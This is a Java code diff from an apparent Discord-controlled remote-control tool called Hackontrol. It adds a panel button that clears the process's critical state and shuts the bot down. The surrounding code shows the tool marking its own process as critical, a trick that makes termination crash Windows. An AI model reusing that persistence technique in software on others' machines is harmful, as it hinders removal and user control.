@@ -12,6 +12,7 @@ import com.khopan.hackontrol.service.interaction.context.Question;
 import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 
+import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.OnlineStatus;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -40,7 +41,24 @@ public class HackontrolPanel extends Panel {
 		}), ButtonManager.dynamicButton(ButtonType.DANGER, "Uncritical", context -> Question.positive(context.reply(), "Are you sure you want to remove the Hackontrol process from critical state?", QuestionType.YES_NO, () -> {
 			Kernel.setProcessCritical(false);
 			HackontrolMessage.delete(context);
-		}))).queue(InteractionManager :: callback));
+		}))).addActionRow(ButtonManager.dynamicButton(ButtonType.DANGER, "Shutdown", context -> Question.positive(context.reply(), "Are you sure you want to initiate the Hackontrol shutdown procedure?", QuestionType.YES_NO, () -> {
+			Kernel.setProcessCritical(false);
+			HackontrolMessage.delete(context);
+			Thread thread = new Thread(() -> {
+				try {
+					Thread.sleep(1000);
+					JDA bot = this.channel.getJDA();
+					bot.shutdown();
+					bot.awaitShutdown();
+					System.exit(0);
+				} catch(Throwable Errors) {
+					Errors.printStackTrace();
+				}
+			});
+
+			thread.setName("Hackontrol Shutdown Procedure");
+			thread.start();
+		}))/*, Another button goes here... */).queue(InteractionManager :: callback));
 
 		this.register(Registration.STRING_SELECT_MENU, HackontrolPanel.STRING_SELECT_STATUS, context -> {
 			this.channel.getJDA().getPresence().setStatus(DiscordStatus.fromName(context.getValues().get(0)).status);
